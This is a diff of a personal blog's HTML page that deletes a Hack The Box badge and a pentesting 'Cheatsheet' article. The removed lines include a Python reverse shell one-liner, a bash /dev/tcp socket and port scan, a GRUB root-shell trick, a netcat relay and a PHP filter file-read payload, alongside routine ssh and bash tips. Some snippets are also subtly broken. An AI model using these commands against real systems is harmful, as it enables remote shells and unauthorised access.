@@ -179,8 +179,6 @@ R0lGODlhlACUAJEAAAAAAP///wAAAAAAACH5BAEAAAIALAAAAACUAJQAAAL/jI+py+0Po5y02ouz3rz7
         <h1><a href="index.html" class="header">Thomas Verweij</a></h1>
         <div id="mail">&#x74;&#x76;&#x65;&#x72;&#x77;&#x65;&#x69;&#x6a;&#x40;&#x70;&#x6d;&#x2e;&#x6d;&#x65;</div>
         <p>Hi! Welcome to my blog. Topics I am interested in include programming, security, linux, music and philosophy. I don't post much, but that may change in the future. <p>
-                <p></p>
-        <p><img src="https://www.hackthebox.eu/badge/image/25984" alt="Hack The Box"></p>
         <p>
         <ul>
             <li><a href="https://github.com/fluffhoofd" target="_blank">github &#10548;</a></li>
@@ -193,8 +191,6 @@ R0lGODlhlACUAJEAAAAAAP///wAAAAAAACH5BAEAAAIALAAAAACUAJQAAAL/jI+py+0Po5y02ouz3rz7
             <li><a href="#11-08-2018">A proof that my cat is the master of the universe</a></li>
             <li><a href="#27-03-2018">Self-hosting a password manager with pass</a></li>
             <li><a href="#20-03-2018-1">Scapy</a></li>
-            <li><a href="#20-03-2018">cheatsheet</a></li>
-            <li><a href="#15-02-2018">links</a></li>
             </ul>
         </p>
 
@@ -385,158 +381,7 @@ Pass is nice if you want total control over your passwords or just don't want to
                 Scapy is a nice framework for python which lets you manipulate, build, send and receive network packets. Here is an introductory writeup I made about it (in Dutch, sorry (translation coming soon...(or not (idk))). </p><p><a href="https://fluffhoofd.github.io/scapy.pdf">scapy.pdf</a></p>
                 </p>
             </div>
-        <div class="article"><a href="#20-03-2018" class="article_data" id="20-03-2018">20-03-2018</a>
-        <h2>Cheatsheet</h2>
-<p>This is just a list of useful commands or code.</p>
-<h4>bash tcp socket</h4>
-<pre>
-exec 5<>/dev/tcp/192.168.4.112/8080
-cat <&5
-</pre>
-<h4>bash portscan</h4>
-<pre>
-for ((x=1;x<=1000;x++));do (echo >/dev/tcp/127.0.0.1/$x) &>/dev/null && echo $x open; done
-</pre>
-<h4>bash password generator</h4>
-<pre>
-echo $(head /dev/urandom | tr -dc "a-zA-Z0-9" | head -c 30)
-</pre>
-<h4>bash mangling</h4>
-<pre>
-varname=file.tar.gz
-echo ${varname%.*}      # file.tar
-echo ${varname%%.*}     # file
-echo ${varname#*.}      # tar.gz
-echo ${varname##*.}     # gz
-</pre>
-<h4>grub privilege escalation</h4>
-<pre>
-kernel parameters: init=/bin/bash
-boot linux and run: mount -o remount,rw /
-</pre>
-<h4>curl upload file</h4>
-<pre>
-curl -T [file] -u [user] [url]
-</pre>
-<h4>get public IP</h4>
-<pre>
-curl ipinfo.io
-</pre>
-<h4>nmap scripts</h4>
-<pre>
-locate nmap/scripts | grep [keyword]
-</pre>
-<h4>netcat tcp proxy</h4>
-<pre>
-mkfifo pipe
-nc -nlvp 12345 < pipe | nc 192.168.168.192 80 > pipe
-</pre>
-<h4>ssh SOCKS proxy:</h4>
-<pre>
-ssh -D localhost:port [user@]server 
-</pre>
-<h4>ssh remote port forward</h4>
-<pre>
-ssh -R 8080:localhost:80 [user@]server
-</pre>
-<h4>ssh local port forward</h4>
-<pre>
-ssh -L 8080:localhost:80 [user@]server
-</pre>
-<h4>ssh flags</h4>
-<pre>
--i  keyfile
--f  background
--N  only port forwarding, no commands
-</pre>
-<h4>ssh create key</h4>
-<pre>
-ssh-keygen
-</pre>
-<h4>ssh upload key</h4>
-<pre>
-ssh-copy-id -i [file] [user@]server
-</pre>
-<h4>linux wireless</h4>
-<pre>
-sudo iw dev wlan1 scan | grep -Ei 'ssid|rsn'
-
-wpa_passphrase [ssid] [password] > passwordfile
-
-wpa_supplicant -i [dev] -B -c [passwordfile]
-
-dhclient [dev]
-</pre>
-<h4>screenlock (pixelated screenshot)</h4>
-<pre>
-scrot '%Y-%m-%d_$wx$h.png' -e 'convert $f -scale 5% -scale 2000% lol.png && rm $f && i3lock -u -i lol.png && rm lol.png'
-</pre>
-<h4>python http-server</h4>
-<pre>
-python2 -m SimpleHTTPServer [port]
--or-
-python3 -m http.server [port]
-</pre>
-<h4>python socket client</h4>
-<pre>
-import socket
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((127.0.0.1, 80))
-print(s.recv(1024))
-s.close  
-</pre>
-<h4>python socket server</h4>
-<pre>
-import socket
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((127.0.0.1, 80))
-s.listen(1)
-while True:
-    c, a = s.accept()
-    c.send('message')
-    c.close()
-</pre>
-<h4>python reverse shell</h4>
-<pre>
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-</pre>
-<h4>python shell</h4>
-<pre>
-python3 -c 'import pty;pty.spawn("/bin/bash")'
-</pre>
-<h4>find SUID/SGID files</h4>
-<pre>
-find ~ -perm /6000 -exec ls -ldb {} \;
-</pre>
-<h4>list status of git repos</h4>
-<pre>
-find ~ -name ".git" 2> /dev/null | sed 's/\/.git/\//g' | awk '{print "-------------------------\n\033[1;32mGit Repo:\033[0m " $1; system("git --git-dir="$1".git --work-tree="$1" status")}'
-</pre>
-<h4>chromium flags for security testing</h4>
-<pre>
-chromium --proxy-server="localhost:8080" --incognito --disable-extensions --disable-xss-auditor
-</pre>
-<h4>PHP filter</h4>
-<pre>
-php://filter/convert.base64-encode/resource=index.php
-</pre>
-<h4>get cheatsheets</h4>
-<pre>
-curl cheat.sh
-</pre></div> 
-
-<div class="article"><a href="#15-02-2018" class="article_data" id="15-02-2018">15-02-2018</a>
-<h2>Links</h2>
-    <p>
-        <ul>
-            <li>todo &#10548;</li>
-            <li>todo &#10548;</li>
-            <li>todo &#10548;</li>
-            <li>todo &#10548;</li>
-            <li>todo &#10548;</li>
-        </ul>
-    </p>
-</div>
+   
         </section>
         <footer>
         </footer>
